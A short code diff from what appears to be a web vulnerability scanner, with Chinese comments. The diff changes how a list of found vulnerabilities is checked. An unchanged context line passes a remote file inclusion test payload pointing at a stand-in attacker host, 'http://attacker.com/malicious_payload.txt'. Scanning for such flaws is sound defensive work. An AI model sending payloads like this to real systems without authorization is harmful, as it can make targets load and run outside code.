@@ -12,7 +12,7 @@ def check_file_inclusion(url):
     scan_remote_file_inclusion(url, file_param="file", file_path="http://attacker.com/malicious_payload.txt")
     vulnerabilities_found.append("远程文件包含漏洞")
 
-    if vulnerabilities_found:
+    if len(vulnerabilities_found)!=0:
         return vulnerabilities_found[-1]  # 只返回最新检测出的漏洞，最多一个
     else:
         return None
